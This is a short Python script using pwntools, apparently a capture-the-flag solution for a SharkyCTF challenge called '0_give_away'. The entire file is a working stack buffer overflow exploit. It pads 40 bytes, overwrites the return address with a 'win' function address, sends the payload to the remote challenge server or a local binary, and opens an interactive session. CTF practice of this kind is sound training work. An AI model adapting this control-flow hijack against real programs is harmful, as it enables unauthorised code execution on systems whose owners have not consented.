import sys
from pwn import *

offset = 40
win_func_addr = 0x004006a7

payload = b"A" * offset
payload += p64(win_func_addr)

if sys.argv[1] == "r":
    r = remote("sharkyctf.xyz", 20333)
else:
    r = process("0_give_away")

r.sendline(payload)

r.interactive()
